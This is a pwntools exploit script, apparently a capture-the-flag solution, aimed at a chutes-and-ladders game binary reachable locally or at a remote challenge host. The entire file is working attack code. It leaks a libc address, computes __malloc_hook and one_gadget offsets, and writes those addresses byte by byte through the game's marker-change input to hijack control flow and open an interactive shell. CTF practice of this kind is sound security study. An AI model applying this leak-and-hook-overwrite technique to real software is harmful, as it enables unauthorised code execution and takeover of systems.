from calendar import c
from re import L
from pwn import *

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.timeout=1
libc=ELF("./libc.so.6")
if args.Q:
    io=remote("mc.ax",31326)
else:
    io=process("./chutes")
sla=lambda a,b : io.sendlineafter(a,b)

def init_player(numb,name,choice="n"):
    sla("Number of players (max 10): ",str(numb))
    for i in range(numb):
        sla("Player %d marker (1 character): "%(i+1),p8((name>>(8*i))&0xff))
    sla("Would you like to change the chutes and ladders? (y/n): ",choice)
def change_mapping():
    mapping1=[
        64,7,
        63,6,
        0xf,0,
        11,9,
        7,3,
        ]
    mapping2=[
        60,93,
        6,99,#100 win
        55,97,
        16,95,
        90,91
        ]
    for i in range(5):
        sla("Enter a chute in the format [start][space][end]: ",str(mapping1[i*2])+" "+str(mapping1[1+i*2]))
    for i in range(5):
        sla("Enter a ladder in the format [start][space][end]: ",str(mapping2[i*2])+" "+str(mapping2[1+i*2]))
def turn(c,name='a',a='n'):
    sla("Would you like to change your marker? (y/n): ",a)
    if (a=="y"):
        sla(": ",name)
    sla("What did you spin? (1-6): ",str(c))
    sla("Would you like to take a look at the board now? (y/n): ","n")
def main():
    init_player(0xa,0xdeadbbefdeadbeef,'y')
    change_mapping()
    sla("Would you like to change your marker? (y/n): ","n")
    sla("What did you spin? (1-6): ",str(6))
    io.recvuntil("0x")
    libc_addr=int(io.recv(12),16)-libc.sym['puts']
    malloc_hook=libc_addr+libc.sym["__malloc_hook"]-4
    ogg=libc_addr+[0xe6c7e ,0xe6c81 ,0xe6c84][1]
    print("libc_addr==>"+hex(libc_addr))
    sla("Would you like to change the chutes and ladders? (y/n): ",'n')#1 0
    #free -> bins  vitcm->bins
    for i in range(8):
                #1 0
        turn(1)#2-9 1
    turn(3)#10 3
    turn(4)
    for i in range(8):
        turn(3)#1 3 2-9 4
    turn(4)#10 7->3
    
    turn(3,p8((malloc_hook>>(8*(0)))&0xff),'y') #1->7->3
    for i in range(7):
        turn(3,p8((malloc_hook>>(8*(i+1)))&0xff),'y')#2-8 3
    turn(4)#9 5
    turn(1)#10 4
    for i in range(8):
        turn(4)#1-8 3
    turn(3)#9 8 
    turn(6)#10 10
    turn(6,p8((ogg>>(8*(0)))&0xff),'y')#1 7
    for i in range(7):
        turn(6,p8((ogg>>(8*(i+1)))&0xff),'y')#2-8  9
    # turn(6,p8(0),'y')#10
    turn(1)#9
    turn(2)#10
    turn(2)#1
    turn(2)#2
    turn(2)#3
    turn(2)#4
    turn(4,p8((ogg>>(8*(0)))&0xff),'y')#5
    for i in range(3):
        turn(4,p8((ogg>>(8*(i+1)))&0xff),'y')#2-8  9
    turn(3,p8((ogg>>(8*(3+1)))&0xff),'y')
    turn(1,p8((ogg>>(8*(4+1)))&0xff),'y')
    sla("Would you like to change your marker? (y/n): ",'n')
    #gdb.attach(io,"b *0x1BC7+0x555555554000\nb *0x7ffff7dbd000"+hex(system))
    sla("What did you spin? (1-6): ",str(6))
    #gdb.attach(io,"b *0x000055555555595e")

    io.interactive()
if __name__=='__main__':
    main()
